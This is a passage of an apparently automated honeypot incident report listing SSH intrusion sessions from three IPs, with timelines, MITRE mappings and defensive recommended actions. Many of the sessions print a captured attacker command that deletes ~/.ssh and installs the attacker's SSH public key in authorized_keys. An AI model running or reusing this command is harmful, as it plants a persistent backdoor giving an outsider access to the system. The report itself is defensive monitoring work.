| `2026-06-08 12:41:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.54[.]66` to AbuseIPDB if not already reported
- [ ] Block `101.126.54[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cedcced6cb6

| Field | Detail |
|---|---|
| **Source IP** | `68.183.212[.]68` |
| **First Seen** | 2026-06-08 12:42 |
| **Last Seen** | 2026-06-08 12:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 12:42:50` | `cowrie.session.connect` |
| `2026-06-08 12:42:50` | `cowrie.client.version` |
| `2026-06-08 12:42:50` | `cowrie.client.kex` |
| `2026-06-08 12:42:50` | `cowrie.login.success` |
| `2026-06-08 12:42:51` | `cowrie.session.params` |
| `2026-06-08 12:42:51` | `cowrie.command.input` |
| `2026-06-08 12:42:51` | `cowrie.command.failed` |
| `2026-06-08 12:42:51` | `cowrie.log.closed` |
| `2026-06-08 12:42:51` | `cowrie.session.params` |
| `2026-06-08 12:42:51` | `cowrie.command.input` |
| `2026-06-08 12:42:51` | `cowrie.session.file_download` |
| `2026-06-08 12:42:51` | `cowrie.log.closed` |
| `2026-06-08 12:42:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.212[.]68` to AbuseIPDB if not already reported
- [ ] Block `68.183.212[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56fcb84d06b5

| Field | Detail |
|---|---|
| **Source IP** | `68.183.212[.]68` |
| **First Seen** | 2026-06-08 12:42 |
| **Last Seen** | 2026-06-08 12:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 12:42:53` | `cowrie.session.connect` |
| `2026-06-08 12:42:53` | `cowrie.client.version` |
| `2026-06-08 12:42:53` | `cowrie.client.kex` |
| `2026-06-08 12:42:54` | `cowrie.login.success` |
| `2026-06-08 12:42:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.212[.]68` to AbuseIPDB if not already reported
- [ ] Block `68.183.212[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-deb803a6d0f2

| Field | Detail |
|---|---|
| **Source IP** | `35.188.112[.]111` |
| **First Seen** | 2026-06-08 12:46 |
| **Last Seen** | 2026-06-08 12:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 12:46:58` | `cowrie.session.connect` |
| `2026-06-08 12:46:58` | `cowrie.client.version` |
| `2026-06-08 12:46:58` | `cowrie.client.kex` |
| `2026-06-08 12:46:59` | `cowrie.login.success` |
| `2026-06-08 12:46:59` | `cowrie.session.params` |
| `2026-06-08 12:46:59` | `cowrie.command.input` |
| `2026-06-08 12:46:59` | `cowrie.command.failed` |
| `2026-06-08 12:47:00` | `cowrie.log.closed` |
| `2026-06-08 12:47:00` | `cowrie.session.params` |
| `2026-06-08 12:47:00` | `cowrie.command.input` |
| `2026-06-08 12:47:00` | `cowrie.session.file_download` |
| `2026-06-08 12:47:00` | `cowrie.log.closed` |
| `2026-06-08 12:47:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.188.112[.]111` to AbuseIPDB if not already reported
- [ ] Block `35.188.112[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93a56db20e3d

| Field | Detail |
|---|---|
| **Source IP** | `35.188.112[.]111` |
| **First Seen** | 2026-06-08 12:47 |
| **Last Seen** | 2026-06-08 12:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 12:47:03` | `cowrie.session.connect` |
| `2026-06-08 12:47:03` | `cowrie.client.version` |
| `2026-06-08 12:47:04` | `cowrie.client.kex` |
| `2026-06-08 12:47:05` | `cowrie.login.success` |
| `2026-06-08 12:47:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.188.112[.]111` to AbuseIPDB if not already reported
- [ ] Block `35.188.112[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08eb5d74a97a

| Field | Detail |
|---|---|
| **Source IP** | `68.183.212[.]68` |
| **First Seen** | 2026-06-08 12:47 |
| **Last Seen** | 2026-06-08 12:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 12:47:52` | `cowrie.session.connect` |
| `2026-06-08 12:47:52` | `cowrie.client.version` |
| `2026-06-08 12:47:52` | `cowrie.client.kex` |
| `2026-06-08 12:47:53` | `cowrie.login.success` |
| `2026-06-08 12:47:53` | `cowrie.session.params` |
| `2026-06-08 12:47:53` | `cowrie.command.input` |
| `2026-06-08 12:47:53` | `cowrie.command.failed` |
| `2026-06-08 12:47:53` | `cowrie.log.closed` |
| `2026-06-08 12:47:54` | `cowrie.session.params` |
| `2026-06-08 12:47:54` | `cowrie.command.input` |
| `2026-06-08 12:47:54` | `cowrie.session.file_download` |
| `2026-06-08 12:47:54` | `cowrie.log.closed` |
| `2026-06-08 12:47:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.212[.]68` to AbuseIPDB if not already reported
- [ ] Block `68.183.212[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f38c5a9bec14

| Field | Detail |
|---|---|
| **Source IP** | `68.183.212[.]68` |
| **First Seen** | 2026-06-08 12:47 |
| **Last Seen** | 2026-06-08 12:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 12:47:56` | `cowrie.session.connect` |
| `2026-06-08 12:47:56` | `cowrie.client.version` |
| `2026-06-08 12:47:56` | `cowrie.client.kex` |
| `2026-06-08 12:47:56` | `cowrie.login.success` |
| `2026-06-08 12:47:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.212[.]68` to AbuseIPDB if not already reported
- [ ] Block `68.183.212[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e19d58cb6074

| Field | Detail |
|---|---|
| **Source IP** | `35.188.112[.]111` |
| **First Seen** | 2026-06-08 12:48 |
| **Last Seen** | 2026-06-08 12:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 12:48:35` | `cowrie.session.connect` |
| `2026-06-08 12:48:35` | `cowrie.client.version` |
| `2026-06-08 12:48:36` | `cowrie.client.kex` |
| `2026-06-08 12:48:37` | `cowrie.login.success` |
| `2026-06-08 12:48:37` | `cowrie.session.params` |
| `2026-06-08 12:48:37` | `cowrie.command.input` |
| `2026-06-08 12:48:37` | `cowrie.command.failed` |
| `2026-06-08 12:48:38` | `cowrie.log.closed` |
| `2026-06-08 12:48:38` | `cowrie.session.params` |
| `2026-06-08 12:48:38` | `cowrie.command.input` |
| `2026-06-08 12:48:38` | `cowrie.session.file_download` |
| `2026-06-08 12:48:38` | `cowrie.log.closed` |
| `2026-06-08 12:48:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.188.112[.]111` to AbuseIPDB if not already reported
- [ ] Block `35.188.112[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d4e2c890f00

| Field | Detail |
|---|---|
| **Source IP** | `35.188.112[.]111` |
| **First Seen** | 2026-06-08 12:48 |
| **Last Seen** | 2026-06-08 12:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 12:48:41` | `cowrie.session.connect` |
| `2026-06-08 12:48:41` | `cowrie.client.version` |
| `2026-06-08 12:48:41` | `cowrie.client.kex` |
| `2026-06-08 12:48:42` | `cowrie.login.success` |
| `2026-06-08 12:48:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.188.112[.]111` to AbuseIPDB if not already reported
- [ ] Block `35.188.112[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-981542ac9846

| Field | Detail |
|---|---|
| **Source IP** | `68.183.212[.]68` |
| **First Seen** | 2026-06-08 12:51 |
| **Last Seen** | 2026-06-08 12:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 12:51:19` | `cowrie.session.connect` |
| `2026-06-08 12:51:19` | `cowrie.client.version` |
| `2026-06-08 12:51:19` | `cowrie.client.kex` |
| `2026-06-08 12:51:20` | `cowrie.login.success` |
| `2026-06-08 12:51:20` | `cowrie.session.params` |
| `2026-06-08 12:51:20` | `cowrie.command.input` |
| `2026-06-08 12:51:20` | `cowrie.command.failed` |
| `2026-06-08 12:51:20` | `cowrie.log.closed` |
| `2026-06-08 12:51:20` | `cowrie.session.params` |
| `2026-06-08 12:51:20` | `cowrie.command.input` |
| `2026-06-08 12:51:20` | `cowrie.session.file_download` |
| `2026-06-08 12:51:20` | `cowrie.log.closed` |
| `2026-06-08 12:51:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.212[.]68` to AbuseIPDB if not already reported
- [ ] Block `68.183.212[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69aad71f0039

| Field | Detail |
|---|---|
| **Source IP** | `68.183.212[.]68` |
| **First Seen** | 2026-06-08 12:51 |
| **Last Seen** | 2026-06-08 12:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 12:51:23` | `cowrie.session.connect` |
| `2026-06-08 12:51:23` | `cowrie.client.version` |
| `2026-06-08 12:51:23` | `cowrie.client.kex` |
| `2026-06-08 12:51:23` | `cowrie.login.success` |
| `2026-06-08 12:51:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.212[.]68` to AbuseIPDB if not already reported
- [ ] Block `68.183.212[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-169c305c28ec

| Field | Detail |
|---|---|
| **Source IP** | `101.126.54[.]66` |
| **First Seen** | 2026-06-08 12:51 |
| **Last Seen** | 2026-06-08 12:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 12:51:27` | `cowrie.session.connect` |
| `2026-06-08 12:51:27` | `cowrie.client.version` |
| `2026-06-08 12:51:28` | `cowrie.client.kex` |
| `2026-06-08 12:51:30` | `cowrie.login.success` |
| `2026-06-08 12:51:31` | `cowrie.session.params` |
| `2026-06-08 12:51:31` | `cowrie.command.input` |
| `2026-06-08 12:51:31` | `cowrie.command.failed` |
| `2026-06-08 12:51:31` | `cowrie.log.closed` |
| `2026-06-08 12:51:32` | `cowrie.session.params` |
| `2026-06-08 12:51:32` | `cowrie.command.input` |
| `2026-06-08 12:51:32` | `cowrie.session.file_download` |
| `2026-06-08 12:51:32` | `cowrie.log.closed` |
| `2026-06-08 12:51:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.54[.]66` to AbuseIPDB if not already reported
- [ ] Block `101.126.54[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfb7300723a5

| Field | Detail |
|---|---|
| **Source IP** | `101.126.54[.]66` |
| **First Seen** | 2026-06-08 12:51 |
| **Last Seen** | 2026-06-08 12:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 12:51:34` | `cowrie.session.connect` |
| `2026-06-08 12:51:34` | `cowrie.client.version` |
| `2026-06-08 12:51:35` | `cowrie.client.kex` |
| `2026-06-08 12:51:35` | `cowrie.login.success` |
| `2026-06-08 12:51:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.54[.]66` to AbuseIPDB if not already reported
- [ ] Block `101.126.54[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2351142092a

| Field | Detail |
|---|---|
| **Source IP** | `35.188.112[.]111` |
| **First Seen** | 2026-06-08 12:53 |
| **Last Seen** | 2026-06-08 12:53 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 12:53:33` | `cowrie.session.connect` |
| `2026-06-08 12:53:33` | `cowrie.client.version` |
| `2026-06-08 12:53:33` | `cowrie.client.kex` |
| `2026-06-08 12:53:34` | `cowrie.login.success` |
| `2026-06-08 12:53:35` | `cowrie.session.params` |
| `2026-06-08 12:53:35` | `cowrie.command.input` |
| `2026-06-08 12:53:35` | `cowrie.command.failed` |
| `2026-06-08 12:53:35` | `cowrie.log.closed` |
| `2026-06-08 12:53:36` | `cowrie.session.params` |
| `2026-06-08 12:53:36` | `cowrie.command.input` |
| `2026-06-08 12:53:36` | `cowrie.session.file_download` |
| `2026-06-08 12:53:36` | `cowrie.log.closed` |
| `2026-06-08 12:53:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.188.112[.]111` to AbuseIPDB if not already reported
- [ ] Block `35.188.112[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf03c51b9259

| Field | Detail |
|---|---|
| **Source IP** | `35.188.112[.]111` |
| **First Seen** | 2026-06-08 12:53 |
| **Last Seen** | 2026-06-08 12:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 12:53:39` | `cowrie.session.connect` |
| `2026-06-08 12:53:39` | `cowrie.client.version` |
| `2026-06-08 12:53:39` | `cowrie.client.kex` |
| `2026-06-08 12:53:40` | `cowrie.login.success` |
| `2026-06-08 12:53:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.188.112[.]111` to AbuseIPDB if not already reported
- [ ] Block `35.188.112[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0409c8f893c8

| Field | Detail |
|---|---|
| **Source IP** | `68.183.212[.]68` |
| **First Seen** | 2026-06-08 12:54 |
| **Last Seen** | 2026-06-08 12:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 12:54:34` | `cowrie.session.connect` |
| `2026-06-08 12:54:34` | `cowrie.client.version` |
| `2026-06-08 12:54:35` | `cowrie.client.kex` |
| `2026-06-08 12:54:35` | `cowrie.login.success` |
| `2026-06-08 12:54:35` | `cowrie.session.params` |
| `2026-06-08 12:54:35` | `cowrie.command.input` |
| `2026-06-08 12:54:35` | `cowrie.command.failed` |
| `2026-06-08 12:54:36` | `cowrie.log.closed` |
| `2026-06-08 12:54:36` | `cowrie.session.params` |
| `2026-06-08 12:54:36` | `cowrie.command.input` |
| `2026-06-08 12:54:36` | `cowrie.session.file_download` |
| `2026-06-08 12:54:36` | `cowrie.log.closed` |
| `2026-06-08 12:54:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.212[.]68` to AbuseIPDB if not already reported
- [ ] Block `68.183.212[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-153d95ca8cfd

| Field | Detail |
|---|---|
| **Source IP** | `68.183.212[.]68` |
| **First Seen** | 2026-06-08 12:54 |
| **Last Seen** | 2026-06-08 12:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 12:54:38` | `cowrie.session.connect` |
| `2026-06-08 12:54:38` | `cowrie.client.version` |
| `2026-06-08 12:54:38` | `cowrie.client.kex` |
| `2026-06-08 12:54:39` | `cowrie.login.success` |
| `2026-06-08 12:54:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.212[.]68` to AbuseIPDB if not already reported
- [ ] Block `68.183.212[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdc10bb1190d

| Field | Detail |
|---|---|
| **Source IP** | `35.188.112[.]111` |
| **First Seen** | 2026-06-08 12:55 |
| **Last Seen** | 2026-06-08 12:55 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
